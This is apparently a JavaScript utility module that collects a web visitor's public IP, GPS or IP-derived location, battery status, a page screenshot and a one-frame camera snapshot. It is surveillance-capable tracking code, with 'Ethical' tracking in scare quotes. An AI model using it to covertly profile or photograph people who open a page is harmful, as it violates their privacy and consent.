import html2canvas from 'html2canvas';

export const getIP = async () => {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return null;
    }
};

export const getGeoLocation = async (ip) => {
    try {
        // Using a free IP geolocation API (e.g., ipapi.co or similar)
        // Note: In production, use a reliable paid service or the one provided by the user if any.
        // For now, we'll try to use the browser's Geolocation API as a primary source for "Ethical" tracking
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: 'GPS'
                        });
                    },
                    async () => {
                        // Fallback to IP geolocation if GPS denied/unavailable
                        try {
                            const res = await fetch(`https://ipapi.co/${ip}/json/`);
                            const data = await res.json();
                            resolve({
                                lat: data.latitude,
                                lng: data.longitude,
                                city: data.city,
                                country: data.country_name,
                                source: 'IP'
                            });
                        } catch (e) {
                            resolve(null);
                        }
                    }
                );
            } else {
                resolve(null);
            }
        });

    } catch (error) {
        console.error('Error fetching GeoLocation:', error);
        return null;
    }
};

export const getBatteryStatus = async () => {
    try {
        // @ts-ignore
        if (navigator.getBattery) {
            // @ts-ignore
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100 + '%',
                charging: battery.charging
            };
        }
    } catch (error) {
        return 'Not Supported';
    }
    return 'Not Supported';
};

export const captureScreen = async () => {
    try {
        const canvas = await html2canvas(document.body);
        return canvas.toDataURL('image/png');
    } catch (e) {
        console.error("Screen capture failed", e);
        return null;
    }
}

export const captureCamera = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await new Promise((resolve) => video.onloadedmetadata = resolve);
        video.play();

        // Wait a bit for camera to adjust
        await new Promise(r => setTimeout(r, 1000));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());

        return canvas.toDataURL('image/jpeg', 0.8);
    } catch (e) {
        console.log("Camera access denied or failed", e);
        return null;
    }
}
